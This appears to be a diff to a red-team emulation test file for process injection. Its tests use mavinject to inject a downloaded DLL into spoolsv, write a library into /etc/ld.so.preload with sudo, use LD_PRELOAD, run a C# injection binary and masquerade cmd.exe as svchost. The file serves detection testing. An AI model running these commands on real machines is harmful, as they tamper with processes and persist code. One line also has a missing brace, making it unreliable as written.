@@ -5,42 +5,138 @@ display_name: Process Injection
 atomic_tests:
 - name: Process Injection via mavinject.exe
   description: |
-    Windows 10 Utility To Inject DLLS
+    Windows 10 Utility To Inject DLLS.
+
+    Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
 
   supported_platforms:
     - windows
-
   input_arguments:
     dll_payload:
       description: DLL to Inject
       type: Path
-      default: C:\AtomicRedTeam\atomics\T1055\src\x64\T1055.dll
+      default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
     process_id:
       description: PID of input_arguments
-      type: Int
-      default: $pid
+      type: Integer
+      default: (get-process spoolsv).id
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Utility to inject must exist on disk at specified location (#{dll_payload})
+      prereq_command: |
+        if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+      get_prereq_command: |
+        New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
   executor:
     name: powershell
+    elevation_required: true
     command: |
-      mavinject $pid /INJECTRUNNING #{dll_payload}
+      $mypid = #{process_id}
+      mavinject $mypid /INJECTRUNNING #{dll_payload}
 
-- name: Process Injection via PowerSploit
+- name: Shared Library Injection via /etc/ld.so.preload
   description: |
-    PowerShell Injection using [PowerSploit Invoke-DLLInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1)
+    This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.
+    
+    Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
+  supported_platforms:
+    - linux
+  input_arguments:
+    path_to_shared_library:
+      description: Path to a shared library object
+      type: Path
+      default: PathToAtomicsFolder/T1055/bin/T1055.so
+    path_to_shared_library_source:
+      description: Path to a shared library source code
+      type: Path
+      default: PathToAtomicsFolder/T1055/src/Linux/T1055.c
+    tmp_folder:
+      description: Path of the temp folder
+      type: Path
+      default: /tmp/1055
+  dependency_executor_name: bash
+  dependencies:
+    - description: |
+        The shared library must exist on disk at specified location (#{path_to_shared_library})
+      prereq_command: |
+        if [ -f #{path_to_shared_library ]; then exit 0; else exit 1; fi;
+      get_prereq_command: |        
+        gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}        
+  executor:
+    name: bash
+    elevation_required: true # indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false
+    command: |
+      sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'
+    cleanup_command:
+      
 
+- name: Shared Library Injection via LD_PRELOAD
+  description: |
+    This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.
+
+    Upon successful execution, bash will utilize LD_PRELOAD to load the shared object library `/etc/ld.so.preload`. Output will be via stdout.
+  supported_platforms:
+    - linux
+  input_arguments:
+    path_to_shared_library:
+      description: Path to a shared library object
+      type: Path
+      default: PathToAtomicsFolder/T1055/bin/T1055.so
+    path_to_shared_library_source:
+      description: Path to a shared library source code
+      type: Path
+      default: PathToAtomicsFolder/T1055/src/Linux/T1055.c
+  dependency_executor_name: bash
+  dependencies:
+    - description: |
+        The shared library must exist on disk at specified location (#{path_to_shared_library})
+      prereq_command: |
+        if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;
+      get_prereq_command: |        
+        gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}
+  executor:
+    name: bash
+    elevation_required: false # indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false
+    command: |
+      LD_PRELOAD=#{path_to_shared_library} ls
+
+- name: Process Injection via C#
+  description: |
+    Process Injection using C#
+    reference: https://github.com/pwndizzle/c-sharp-memory-injection
+    Excercises Five Techniques
+    1. Process injection
+    2. ApcInjectionAnyProcess
+    3. ApcInjectionNewProcess
+    4. IatInjection
+    5. ThreadHijack
+    Upon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.
   supported_platforms:
     - windows
-
   input_arguments:
-    dll_payload:
-      description: DLL to Inject
+    exe_binary:
+      description: Output Binary
       type: Path
-      default: T1055.dll
-    process_id:
-      description: PID of input_arguments
-      type: Int
-      default: $pid
+      default: T1055.exe
   executor:
-    name: powershell
+    name: command_prompt
     command: |
-      Invoke-DllInjection.ps1 -ProcessID #{process_id} -Dll #{dll_payload}
+      .\bin\#{exe_binary}
+
+- name: svchost writing a file to a UNC path
+  description: |
+    svchost.exe writing a non-Microsoft Office file to a file with a UNC path.
+    Upon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\`, then execute svchost.exe with output to a txt file.
+  supported_platforms:
+    - windows
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      copy C:\Windows\System32\cmd.exe C:\svchost.exe
+      C:\svchost.exe /c echo T1055 > \\localhost\c$\T1055.txt
+    cleanup_command: |
+      del C:\T1055.txt >nul 2>&1
+      del C:\svchost.exe >nul 2>&1
